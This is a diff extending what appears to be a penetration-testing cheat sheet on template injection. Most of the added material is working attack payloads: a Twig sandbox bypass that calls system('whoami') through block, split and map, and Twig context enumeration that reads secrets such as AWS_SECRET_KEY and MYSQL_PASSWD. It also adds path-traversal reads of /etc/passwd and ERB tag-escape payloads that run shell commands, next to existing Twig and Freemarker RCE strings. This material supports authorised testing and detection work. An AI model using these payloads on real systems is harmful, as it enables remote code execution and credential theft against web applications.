@@ -12,6 +12,14 @@ JavaScript execution in the victim's browser (XSS-class, but via template).
 
 SSTI is Critical (server RCE). CSTI is High (client XSS).
 
+## DETECTION — INITIAL ERROR TRIGGER
+
+First, break the template syntax to confirm server-side evaluation:
+```
+{   }   $   #   @   %)   "   '   |   {{   }}   ${   <%   <%=   %>
+```
+Any error, stack trace, or changed response → potential injection point. Then fingerprint.
+
 ## DETECTION — UNIVERSAL PROBE
 
 ```
@@ -83,7 +91,7 @@ grep -rn "params\[\|request\.\(GET\|POST\)\|user_input" --include="*.py" --inclu
 
 ### Twig (PHP)
 ```php
-// RCE via filter
+// RCE via filter (unsandboxed)
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 
 // Twig 1.x
@@ -91,6 +99,30 @@ grep -rn "params\[\|request\.\(GET\|POST\)\|user_input" --include="*.py" --inclu
 
 // PHP code execution
 {{ "/etc/passwd"|file_excerpt(0,20) }}
+
+// Sandbox bypass (when direct function calls are blocked):
+// Uses block(), split(), map(), and join() — no direct function call needed
+{%block X%}whoamiINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
+// Deconstruction:
+//   block('X')           → "whoamiINTIGRITIsystem"
+//   split('INTIGRITI')   → ["whoami", "system"]
+//   y|first = "whoami" (command), y|last = "system" (PHP function)
+//   map() calls system("whoami") → RCE without explicit function call
+```
+
+### Twig — variable enumeration and secret/object extraction
+```
+// Enumerate all template variables (keys) — reveals registered objects:
+{{_context|keys|join(',')}}
+
+// Once object names are known, access their properties directly:
+{{secrets.MYSQL_PASSWD}}
+{{secrets.AWS_SECRET_KEY}}
+
+// Leverage insecure custom object functions for LFI (path traversal):
+{{files.get_style_sheet('../../../../../etc/passwd')}}
+// Replace get_style_sheet with whatever function the object exposes
+// Enumerate functions by probing: {{object.methodName('test')}}
 ```
 
 ### Freemarker (Java)
@@ -121,6 +153,11 @@ ${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).inv
 
 ### ERB (Ruby)
 ```ruby
+# If injecting inside an existing template context, escape first:
+%><%=`whoami`    # closes current tag, opens eval tag, executes command
+%><%=7*7         # confirm injection with math first
+
+# Direct RCE:
 <%= `id` %>
 <%= system("id") %>
 <%= IO.popen('id').readlines() %>
